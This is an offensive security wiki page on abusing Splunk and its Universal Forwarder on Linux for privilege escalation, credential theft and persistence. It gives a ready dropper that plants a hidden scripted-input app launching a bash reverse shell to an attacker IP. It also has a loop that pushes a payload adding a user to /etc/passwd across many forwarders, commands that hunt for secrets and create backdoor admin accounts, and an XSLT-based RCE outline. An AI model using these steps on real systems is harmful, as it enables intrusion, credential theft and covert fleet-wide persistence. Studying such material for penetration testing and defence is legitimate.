title: Linux - Splunk LPE and Persistence
html:
Splunk LPE and Persistence

If enumerating a machine internally or externally you find Splunk running (usually 8000 for the web UI and 8089 for the management API), valid credentials can often be turned into code execution through app installation, scripted inputs, or management actions.[1][5][6][10] If Splunk is running as root, that frequently becomes an immediate privilege escalation.[1]

If you only need the generic remote attack surface, enumeration, or app-upload RCE path, check:

../../network-services-pentesting/8089-splunkd.md

If you are already root and the Splunk service is not listening only on localhost, you can also steal Splunk password hashes, recover encrypted secrets, or push a malicious app to keep persistence locally or across multiple forwarders.[7][8][11]

Interesting Local Files

When you land on a host running Splunk or Splunk Universal Forwarder, these are usually the most interesting paths:[7][8][9][10][11]

export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null

Important artifacts:

  • $SPLUNK_HOME/etc/passwd: local Splunk users and password hashes.[7]
  • $SPLUNK_HOME/etc/auth/splunk.secret: key used by Splunk to encrypt secrets stored in several .conf files.[8]
  • $SPLUNK_HOME/etc/system/local/user-seed.conf: initial admin bootstrap file; useful in gold images and provisioning mistakes. It is ignored if etc/passwd already exists.[9]
  • $SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf: where scripted inputs are commonly enabled.[10]
  • $SPLUNK_HOME/etc/deployment-apps/ or $SPLUNK_HOME/etc/apps/: good places to hide a persistent app or review what is already being distributed.[11]

Splunk Universal Forwarder Agent Exploit Summary

For further details check https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/. This is just a summary.[1]

Exploit overview: An exploit targeting the Splunk Universal Forwarder (UF) allows attackers with the agent password to execute arbitrary code on systems running the agent, potentially compromising a large portion of the environment.[1]

Why it works:

  • The UF management service is commonly exposed on TCP 8089.[6]
  • Attackers can authenticate to the API and instruct the forwarder to install a malicious app bundle.[1][5]
  • The same primitive can be used locally for LPE or remotely for RCE.[5]
  • Public tooling such as SplunkWhisperer2 creates the app bundle automatically and can adapt payloads for Linux targets.[5]

Common ways to recover the password:

  • Cleartext credentials in documentation, scripts, shares, or deployment automation.[1]
  • Password hashes inside $SPLUNK_HOME/etc/passwd followed by offline cracking.[1][7]
  • Golden images or provisioning leftovers such as user-seed.conf.[1][9]

Impact:

  • SYSTEM/root-level code execution on each compromised host.[1]
  • Deployment of persistent apps, backdoors, or ransomware.[1]
  • Disabling or tampering with telemetry before the data is forwarded.[1]

Example command for exploitation:

The original report demonstrates the following loop for sending a payload to multiple forwarders.[1]

for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username <username> --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done

Usable public exploits:

  • https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
  • https://www.exploit-db.com/exploits/46238
  • https://www.exploit-db.com/exploits/46487

Persistence via Scripted Inputs or Malicious Apps

If you have filesystem write access as root/splunk, or authenticated access to install apps, a very reliable persistence mechanism is to drop a custom app with a scripted input.[2][5][10] Splunk's own documentation expects scripted inputs to live under an app directory and be enabled from inputs.conf.[10]

Typical layout:

/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf

Minimal inputs.conf:[10]

[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd

Quick Linux dropper (using that documented app layout):[10]

APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart

Notes:

  • The same trick works on Universal Forwarder using /opt/splunkforwarder/etc/apps/.[2][10]
  • Attackers often blend in by modifying a legitimate add-on instead of creating an obviously malicious app.[2]
  • On a deployment server, planting a malicious app inside deployment-apps/ turns into fleet-wide persistence because forwarders poll, download updated apps, and often restart to apply them.[11][12]

Credential Theft and Admin Takeover

If you can read Splunk's local files, there are usually two good goals: recover Splunk admin access and recover encrypted service credentials.[8]

Password hashes and local users

Splunk stores local authentication data in etc/passwd. Depending on the deployment, cracking that file can recover working credentials for the web UI and the management API.[1][7]

If you already have valid admin credentials and Splunk uses its native authentication backend, the CLI itself can be used for persistence.[13]

"$SPLUNK_HOME/bin/splunk" edit <USERNAME> <username> -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add <USERNAME> svc_backup -password 'Winter2026!' -role <username> -auth admin:'OldPassword!'

splunk.secret and encrypted values

Splunk uses etc/auth/splunk.secret to protect sensitive values stored in multiple configuration files. If you can steal both the secret and the relevant .conf files, you can often recover or replay:[8]

  • forwarder/indexer shared secrets such as pass4SymmKey
  • TLS private-key passwords such as sslPassword
  • LDAP bind credentials such as bindDNPassword

This can support lateral movement even when the Splunk admin password itself is not crackable.[8]

user-seed.conf abuse

user-seed.conf is only consumed during first start or when etc/passwd does not exist. That makes it less useful on a live box, but very interesting in:[9]

  • compromised installation templates
  • container images
  • unattended provisioning workflows
  • appliances where Splunk is reinitialized automatically

In those cases, planting a HASHED_PASSWORD generated with splunk hash-passwd gives you a quiet way to regain admin access after redeployment.[9]

Abusing Splunk Queries

For further details check https://blog.hrncirik.net/cve-2023-46214-analysis.[3][4]

A useful recent technique is abusing user-supplied XSLT in vulnerable Splunk Enterprise versions to turn a low-privileged authenticated account into OS command execution as the splunk user.[3][4]

High-level flow:[3][4]

  1. Authenticate to Splunk.
  2. Upload a malicious XSL file through the preview/upload functionality.
  3. Make Splunk render search results with that uploaded stylesheet from the dispatch directory.
  4. Use the XSLT payload to write a file or trigger execution through Splunk's search pipeline (for example by reaching internal functionality such as runshellscript).

The important offensive takeaway is that this path is post-auth RCE without needing app upload. On Linux it usually lands you in the splunk account, which is still valuable because that user often owns the application tree, can read secrets, and can plant persistent apps that survive shell loss.[3][4]

A representative path used during exploitation is:[4]

/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl

If Splunk is running with too many privileges, or if the splunk user has access to dangerous scripts, writable service units, or bad sudo rules, this becomes a clean LPE chain.
